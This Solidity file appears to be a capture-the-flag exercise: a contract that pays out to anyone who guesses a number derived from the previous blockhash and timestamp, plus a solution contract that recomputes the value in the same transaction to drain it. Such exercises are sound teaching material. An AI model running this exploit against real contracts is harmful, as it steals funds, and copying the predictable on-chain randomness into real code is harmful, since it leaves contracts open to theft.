// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer =  uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
             require(ok, "Fail to send to msg.sender");
             pass = true;
        }
    }

     receive() external payable {}
}

/** CODE YOUR SOLUTION HERE */
contract Attacker {
    uint8 public answer;

    GuessNewNumber public guessNewNumber;

    constructor(address payable _guessNewNumberAddress) payable {
        require(msg.value == 1 ether, "Attacker: need to send 1 ether to constructor");
        guessNewNumber = GuessNewNumber(_guessNewNumberAddress);
    }

    function attack() public {
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         
        guessNewNumber.guess{value: 1 ether}(answer);
    }

    receive() external payable {}
}
